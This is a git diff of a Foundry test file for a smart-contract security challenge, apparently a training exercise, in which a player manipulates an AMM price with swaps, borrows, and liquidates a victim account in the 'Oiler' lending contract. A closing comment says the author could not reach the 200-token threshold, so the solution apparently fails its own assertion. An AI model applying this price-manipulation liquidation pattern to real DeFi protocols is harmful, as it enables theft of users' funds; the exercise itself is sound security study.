@@ -2,6 +2,8 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {Oiler} from "../src/8_oiler/Oiler.sol";
 import {AMM} from "../src/8_oiler/AMM.sol";
@@ -64,8 +66,7 @@ contract Challenge8Test is Test {
         vm.stopPrank();
     }
 
-
-    function testSolution()public {
+    function testSolution() public {
         // Victim set up
         vm.startPrank(superman);
         token.approve(address(oiler), 100);
@@ -74,7 +75,6 @@ contract Challenge8Test is Test {
         oiler.borrow(75);
         oiler.healthFactor(superman);
         vm.stopPrank();
-
 
         // Player initial balance is of 100 $TOKEN and 100 $DAI
         console.log("Initial token balance: ", token.balanceOf(player));
@@ -87,7 +87,18 @@ contract Challenge8Test is Test {
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        token.approve(address(amm), type(uint256).max);
+        dai.approve(address(amm), type(uint256).max);
+        token.approve(address(oiler), type(uint256).max);
 
+        amm.swap(address(token), 1);
+
+        oiler.deposit(1);
+        oiler.borrow(3);
+
+        oiler.liquidate(superman);
+
+        amm.swap(address(dai), 5);
 
         //==================================================//
         vm.stopPrank();
@@ -99,7 +110,7 @@ contract Challenge8Test is Test {
         Oiler.User memory victim = oiler.getUserData(superman);
         assertEq(victim.liquidated, true);
         assert(token.balanceOf(player) > 200);
-
     }
 
+    // Note: I couln't get more than 200 tokens :/
 }
